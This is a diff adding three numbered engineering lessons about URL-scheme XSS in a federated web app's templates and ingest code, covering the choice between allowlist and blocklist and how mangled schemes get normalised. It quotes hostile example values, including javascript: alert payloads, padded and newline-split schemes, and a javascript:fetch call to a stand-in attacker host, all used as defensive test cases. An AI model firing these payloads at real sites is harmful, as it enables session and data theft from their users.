@@ -12989,3 +12989,32 @@ AST, and pin the rule so a fourth site cannot appear.
 built by assigning `.data` afterwards is refused for `community_name` and the rows asserting the url
 message pass on `accepted is False` while `form.url.errors` is empty. Bind complete formdata, and assert
 the MESSAGE rather than only the refusal.
+
+**899. A TEMPLATE THAT INTERPOLATES A PEER'S VALUE INTO AN `href` IS A SINK, AND `rel="nofollow ugc"` IS NOT A GUARD.**
+`<a href="{{ event.online_link }}" rel="nofollow ugc" target="_blank">` executed
+`javascript:alert(document.domain)` because the ingest read the field with `_as_text`, which checks type and
+width only. `nofollow` is advice to crawlers and `ugc` is provenance; neither affects whether a scheme
+runs. Sweep `href`/`src`/`action` whose value is a bare `{{ expression }}` rather than `url_for(...)`, and
+for each one decide which end holds the guard -- it needs to be exactly one, and it needs to exist.
+
+**900. ALLOWLIST A SCHEME WHERE A LOCAL PRODUCER ALREADY CONSTRAINS THE FIELD; BLOCKLIST WHERE REMOTE SOFTWARE DECIDES WHAT IS LEGITIMATE.**
+This codebase now has both, and the deciding question is not "which is stronger" -- an allowlist always is
+-- but WHO GETS TO SAY what a valid value is. An Event's three links are allowlisted to `http(s)` by
+`_as_url`, because `CreateEventForm` has always required `^https?://` of the same fields, so the audit of
+legitimate values was already done and the federated path was simply not honouring it. Body HTML is
+blocklisted by `has_unsafe_url_scheme`, and the comment at `app/utils.py:404` records why: allowlisting
+there means auditing `matrix:`, `xmpp:`, `gemini:`, `magnet:`, `ipfs:`, `tel:` and the long tail remote
+software emits, and getting that audit wrong silently destroys real links in every remote post. Before
+allowlisting a field, find its local producer -- if there is none, the blocklist is the honest choice and
+should be documented as one.
+
+**901. AN ALLOWLISTED SCHEME FAILS CLOSED UNDER PADDING AND MANGLING; A DENYLISTED ONE HAS TO NORMALISE FIRST.**
+`has_unsafe_url_scheme` exists because `furl(...).scheme` saw no javascript scheme in
+`href=" javascript:alert(1)"` or `href="java<LF>script:..."` -- it does not perform the WHATWG
+normalisation a browser performs before reading a scheme, so a denylist read past the padding and let the
+URL through (the comment at `app/utils.py:703` records it). `_as_url` needs none of that: every one of
+those strings fails `startswith(('http://', 'https://'))` and is dropped. Case is the one normalisation an
+allowlist still needs, because `HTTPS://` is a real URL a browser fetches -- hence `.lower()`. And
+`startswith` rather than `in`, so `javascript:fetch('https://evil.example/steal')` cannot pass by carrying a
+valid scheme further along the string -- the row that separates the two operators has to put a real
+`https://` INSIDE a hostile URL, which is easy to leave out of a table of bad values.
